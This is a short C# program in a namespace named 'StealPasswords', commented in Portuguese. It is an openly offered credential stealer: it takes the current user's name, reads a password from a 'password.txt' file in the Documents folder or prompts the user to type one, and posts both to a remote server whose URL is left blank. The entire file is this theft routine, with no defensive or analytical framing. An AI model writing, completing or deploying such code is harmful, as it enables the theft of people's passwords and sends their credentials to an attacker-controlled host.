using System;
using System.IO;
using System.Net;

namespace StealPasswords
{
    class Program
    {
        static void Main(string[] args)
        {
            // Define a URL do servidor onde as senhas serão enviadas
            string url = "";

            // Obter nome de usuário e senha
            string username = Environment.UserName;
            string password = null;

            // Obter a pasta de documentos do usuário
            string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            // Definir o nome do arquivo onde as senhas serão armazenadas
            string passwordFile = Path.Combine(documentsPath, "password.txt");

            // Se o arquivo existir, ler a senha
            if (File.Exists(passwordFile))
            {
                password = File.ReadAllText(passwordFile);
            }

            // Se a senha estiver vazia, prompt do usuário para inserir a senha
            if (password == null || password == "")
            {
                Console.Write("Insira sua senha: ");
                password = Console.ReadLine();
            }

            // Formar a string que será enviada ao servidor
            string postData = $"username={WebUtility.UrlEncode(username)}&password={WebUtility.UrlEncode(password)}";

            // Criar uma requisição HTTP POST
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = postData.Length;

            // Escrever os dados no corpo da requisição
            using (StreamWriter writer = new StreamWriter(request.GetRequestStream()))
            {
                writer.Write(postData);
            }

            // Obter a resposta do servidor
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                // Ler a resposta do servidor
                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    string result = reader.ReadToEnd();
                    Console.WriteLine(result);
                }
            }
        }
    }
}
